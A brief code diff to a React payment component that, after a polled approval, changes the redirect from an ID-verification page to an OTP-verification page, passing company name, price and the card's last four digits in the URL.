@@ -213,7 +213,7 @@ const Payment = () => {
 
           setTimeout(() => {
             setWaitingForApproval(false);
-            navigate(`/id-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
+            navigate(`/otp-verification?company=${encodeURIComponent(companyName)}&price=${price}&cardLast4=${lastFour}`);
           }, 2000);
         } else if (data?.status === 'rejected') {
           clearInterval(interval);
